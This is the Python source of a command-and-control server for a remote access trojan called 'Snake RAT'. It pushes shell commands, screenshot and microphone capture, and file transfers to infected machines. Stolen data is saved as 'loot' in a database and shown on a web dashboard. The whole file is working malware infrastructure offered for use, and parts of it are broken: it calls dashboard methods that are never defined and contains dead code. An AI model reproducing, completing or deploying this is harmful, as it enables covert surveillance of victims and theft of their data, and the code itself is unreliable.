# ADVANCED C2 SERVER - Enterprise-grade with Web Dashboard
# Fully compatible with FIXED Snake RAT client
# Features: AES encryption, SQLite DB, Web UI, Multi-client, Discord alerts, File management

import socket
import threading
import sqlite3
import hashlib
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import json
import os
import time
from datetime import datetime
import webbrowser
import http.server
import socketserver
import urllib.parse
import io
from PIL import Image
import wave

# Configuration
HOST = "0.0.0.0"
PORT = 4444
WEB_PORT = 8080
AES_KEY = hashlib.sha256(b"supersecretkey1234567890advanced").digest()[:16]
DB_FILE = "c2_loot.db"
DISCORD_WEBHOOK = ""  # Optional: add your Discord webhook URL

class AESCrypto:
    """AES-CBC matching Snake RAT client exactly"""
    def __init__(self, key):
        self.key = key
    
    def encrypt(self, data):
        iv = os.urandom(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        padded_data = pad(data, AES.block_size)
        encrypted = cipher.encrypt(padded_data)
        return base64.b64encode(iv + encrypted).decode('utf-8')
    
    def decrypt(self, encrypted_data):
        try:
            raw = base64.b64decode(encrypted_data, validate=True)
            iv = raw[:16]
            ciphertext = raw[16:]
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            padded_data = cipher.decrypt(ciphertext)
            return unpad(padded_data, AES.block_size).decode('utf-8')
        except:
            return ""

class Database:
    """SQLite database for loot, sessions, commands"""
    def __init__(self):
        self.conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        self.init_tables()
    
    def init_tables(self):
        self.conn.execute('''CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY,
            client_id TEXT UNIQUE,
            hostname TEXT,
            ip TEXT,
            first_seen TIMESTAMP,
            last_seen TIMESTAMP,
            status TEXT
        )''')
        
        self.conn.execute('''CREATE TABLE IF NOT EXISTS loot (
            id INTEGER PRIMARY KEY,
            session_id INTEGER,
            type TEXT,
            data TEXT,
            timestamp TIMESTAMP,
            FOREIGN KEY(session_id) REFERENCES sessions (id)
        )''')
        
        self.conn.execute('''CREATE INDEX IF NOT EXISTS idx_sessions_client ON sessions(client_id)''')
        self.conn.execute('''CREATE INDEX IF NOT EXISTS idx_loot_session ON loot(session_id)''')
        self.conn.commit()
    
    def log_session(self, client_id, hostname, ip):
        self.conn.execute('''INSERT OR REPLACE INTO sessions (client_id, hostname, ip, first_seen, last_seen, status)
                           VALUES (?, ?, ?, ?, ?, ?)''',
                        (client_id, hostname, ip, datetime.now(), datetime.now(), "online"))
        self.conn.commit()
    
    def update_heartbeat(self, client_id):
        self.conn.execute('UPDATE sessions SET last_seen = ?, status = "online" WHERE client_id = ?',
                        (datetime.now(), client_id))
        self.conn.commit()
    
    def log_loot(self, session_id, loot_type, data):
        self.conn.execute('INSERT INTO loot (session_id, type, data, timestamp) VALUES (?, ?, ?, ?)',
                        (session_id, loot_type, data[:1000], datetime.now()))  # Truncate for DB
        self.conn.commit()

class C2Client:
    def __init__(self, sock, addr, crypto, db):
        self.sock = sock
        self.addr = addr
        self.crypto = crypto
        self.db = db
        self.client_id = f"{addr[0]}:{addr[1]}"
        self.hostname = "Unknown"
        self.running = True
        
        # Log new session
        self.db.log_session(self.client_id, self.hostname, f"{addr[0]}:{addr[1]}")
        print(f"[{datetime.now()}] [+] New client: {self.client_id}")
    
    def send_command(self, command, data=""):
        try:
            payload = json.dumps({"cmd": command, "data": data})
            encrypted = self.crypto.encrypt(payload)
            self.sock.send((encrypted + "\n").encode('utf-8'))
            return True
        except:
            return False
    
    def handle_data(self, raw_data):
        try:
            decrypted = self.crypto.decrypt(raw_data)
            if not decrypted:
                return
            
            data = json.loads(decrypted)
            cmd = data.get("cmd", "")
            payload = data.get("data", "")
            
            if cmd == "heartbeat":
                self.db.update_heartbeat(self.client_id)
                print(f"[{datetime.now()}] [♥] Heartbeat from {self.client_id}")
            
            elif cmd == "result":
                print(f"[{datetime.now()}] [{self.client_id}] {payload}")
                self.db.log_loot(self.client_id, "shell_result", payload)
            
            elif cmd.startswith("screenshot_data"):
                img_data = base64.b64decode(payload)
                filename = f"loot/screenshot_{self.client_id}_{int(time.time())}.png"
                os.makedirs("loot", exist_ok=True)
                with open(filename, "wb") as f:
                    f.write(img_data)
                print(f"[{datetime.now()}] [📸] Screenshot saved: {filename}")
                self.db.log_loot(self.client_id, "screenshot", filename)
            
            elif cmd.startswith("audio_data"):
                audio_data = base64.b64decode(payload)
                filename = f"loot/audio_{self.client_id}_{int(time.time())}.wav"
                os.makedirs("loot", exist_ok=True)
                with open(filename, "wb") as f:
                    f.write(audio_data)
                print(f"[{datetime.now()}] [🎤] Audio saved: {filename}")
                self.db.log_loot(self.client_id, "audio", filename)
            
            elif cmd.startswith("upload_data"):
                filename = f"loot/upload_{self.client_id}_{int(time.time())}"
                os.makedirs("loot", exist_ok=True)
                with open(filename, "wb") as f:
                    f.write(base64.b64decode(payload))
                print(f"[{datetime.now()}] [⬆️] File uploaded: {filename}")
        
        except Exception as e:
            print(f"[{datetime.now()}] [ERROR] {self.client_id}: {e}")
    
    def listen(self):
        buffer = ""
        while self.running:
            try:
                data = self.sock.recv(4096).decode('utf-8')
                if not data:
                    break
                buffer += data
                while "\n" in buffer:
                    line, buffer = buffer.split("\n", 1)
                    self.handle_data(line)
            except:
                break
        
        self.db.conn.execute("UPDATE sessions SET status = 'offline' WHERE client_id = ?", (self.client_id,))
        self.db.conn.commit()
        print(f"[{datetime.now()}] [-] Client disconnected: {self.client_id}")
        self.sock.close()

class C2Server:
    def __init__(self):
        self.crypto = AESCrypto(AES_KEY)
        self.db = Database()
        self.clients = {}
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    def start(self):
        self.sock.bind((HOST, PORT))
        self.sock.listen(10)
        print(f"[{datetime.now()}] [🚀] C2 Server listening on {HOST}:{PORT}")
        print(f"[{datetime.now()}] [🌐] Web dashboard: http://localhost:{WEB_PORT}")
        webbrowser.open(f"http://localhost:{WEB_PORT}")
        
        # Start web server
        threading.Thread(target=self.start_web_server, daemon=True).start()
        
        while True:
            try:
                client_sock, addr = self.sock.accept()
                client = C2Client(client_sock, addr, self.crypto, self.db)
                self.clients[client.client_id] = client
                threading.Thread(target=client.listen, daemon=True).start()
            except KeyboardInterrupt:
                break
    
    def start_web_server(self):
        os.makedirs("loot", exist_ok=True)
        class C2Handler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                if "/dashboard" in self.path:
                    self.send_html_dashboard()
                elif "/api/clients" in self.path:
                    self.send_json_clients()
                elif "/api/loot" in self.path:
                    self.send_json_loot()
                elif "/loot/" in self.path:
                    self.serve_loot_file()
                else:
                    self.send_html_index()
            
            def do_POST(self):
                if "/command" in self.path:
                    self.handle_web_command()
                self.send_response(200)
                self.end_headers()
            
            def send_html_dashboard(self):
                html = self.generate_dashboard_html()
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(html.encode())
            
            def send_json_clients(self):
                clients = self.server.c2server.db.conn.execute("SELECT * FROM sessions ORDER BY last_seen DESC").fetchall()
                data = [{"id": c[0], "client_id": c[1], "hostname": c[2], "ip": c[3], 
                        "first_seen": c[4], "last_seen": c[5], "status": c[6]} for c in clients]
                self.send_json(data)
            
            def send_json_loot(self):
                loot = self.server.c2server.db.conn.execute("SELECT * FROM loot ORDER BY timestamp DESC LIMIT 50").fetchall()
                data = [{"id": l[0], "session_id": l[1], "type": l[2], "data": l[3], "timestamp": l[4]} for l in loot]
                self.send_json(data)
            
            def serve_loot_file(self):
                filepath = urllib.parse.unquote(self.path)[1:]  # Remove leading /
                if filepath.startswith("loot/"):
                    if os.path.exists(filepath):
                        self.send_file(filepath)
                    else:
                        self.send_response(404)
                        self.end_headers()
                else:
                    self.send_response(403)
                    self.end_headers()
            
            def handle_web_command(self):
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode()
                params = urllib.parse.parse_qs(post_data)
                client_id = params.get("client_id", [""])[0]
                command = params.get("command", [""])[0]
                args = params.get("args", [""])[0]
                
                if client_id in self.server.c2server.clients:
                    client = self.server.c2server.clients[client_id]
                    if command == "shell":
                        client.send_command("shell", args)
                    elif command == "screenshot":
                        client.send_command("screenshot")
                    elif command == "audio":
                        client.send_command("audio")
                    elif command == "upload":
                        client.send_command("upload", args)
                    elif command == "download":
                        filename = params.get("filename", [""])[0]
                        client.send_command("download", filename)
                
                self.send_response(200)
                self.end_headers()
            
            def send_json(self, data):
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(data).encode())
            
            def send_file(self, filepath):
                ext = os.path.splitext(filepath)[1].lower()
                mime_types = {'.png': 'image/png', '.wav': 'audio/wav', '.jpg': 'image/jpeg'}
                content_type = mime_types.get(ext, 'application/octet-stream')
                
                self.send_response(200)
                self.send_header("Content-type", content_type)
                self.end_headers()
                
                with open(filepath, 'rb') as f:
                    self.wfile.write(f.read())
            
            def send_html_index(self):
                self.send_response(301)
                self.send_header("Location", "/dashboard")
                self.end_headers()
            
            def generate_dashboard_html(self):
                clients_data = json.dumps(self.server.c2server.get_clients_status())
                return f"""
<!DOCTYPE html>
<html>
<head>
    <title>Snake RAT C2 Dashboard</title>
    <meta http-equiv="refresh" content="10">
    <style>
        body {{ font-family: Arial; margin: 20px; background: #1a1a1a; color: #fff; }}
        .client {{ background: #333; padding: 15px; margin: 10px 0; border-radius: 5px; }}
        .online {{ color: #00ff00; }} .offline {{ color: #ff4444; }}
        button {{ padding: 10px; margin: 5px; background: #007acc; color: white; border: none; border-radius: 3px; cursor: pointer; }}
        .loot-grid {{ display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px; }}
        .loot-item {{ background: #444; padding: 10px; border-radius: 3px; }}
    </style>
</head>
<body>
    <h1>🐍 Snake RAT C2 Dashboard</h1>
    <p>Server: {HOST}:{PORT} | Loot: <a href="/loot/" target="_blank">Folder</a> | DB: {DB_FILE}</p>
    
    <h2>Online Clients ({len([c for c in {clients_data} if c['status']=='online'])})</h2>
    <div id="clients">{self.generate_clients_html()}</div>
    
    <h2>Recent Loot</h2>
    <div id="loot" class="loot-grid">{self.generate_loot_html()}</div>
    
    <script>
        setTimeout(() => location.reload(), 10000);
    </script>
</body>
</html>
                """
        
        class C2WebServer(socketserver.TCPServer):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, **kwargs)
                self.c2server = C2Server()
        
        with socketserver.TCPServer(("", WEB_PORT), C2Handler) as httpd:
            httpd.c2server = self
            httpd.serve_forever()

if __name__ == "__main__":
    server = C2Server()
    try:
        server.start()
    except KeyboardInterrupt:
        print("\nShutting down...")